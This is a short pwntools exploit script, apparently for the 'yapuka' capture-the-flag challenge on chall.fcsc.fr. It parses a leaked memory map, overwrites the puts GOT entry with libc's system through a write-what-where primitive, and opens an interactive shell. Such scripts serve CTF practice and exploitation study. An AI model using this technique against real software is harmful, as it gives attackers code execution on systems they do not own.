from pwn import *

PATH = "./src/yapuka"
LIBC = "./src/libc-2.36.so"
REMOTE = "chall.fcsc.fr"
PORT = 2110

context.binary = elf = ELF(PATH)
libc = ELF(LIBC)

r = remote("chall.fcsc.fr", 2110)
# r = process(PATH)

leak = r.recvuntil("Where:\n")
leak = leak.decode().split('\n')[1:-2]

addr = int(leak[0].split()[0].split("-")[0], 16)
puts_got_addr = addr + elf.got["puts"]

system_addr = libc.symbols["system"] + int(leak[6].split()[0].split("-")[0], 16)

r.sendline(str(puts_got_addr).encode())
r.recvuntil("What:\n")
r.sendline(str(system_addr).encode())
r.interactive()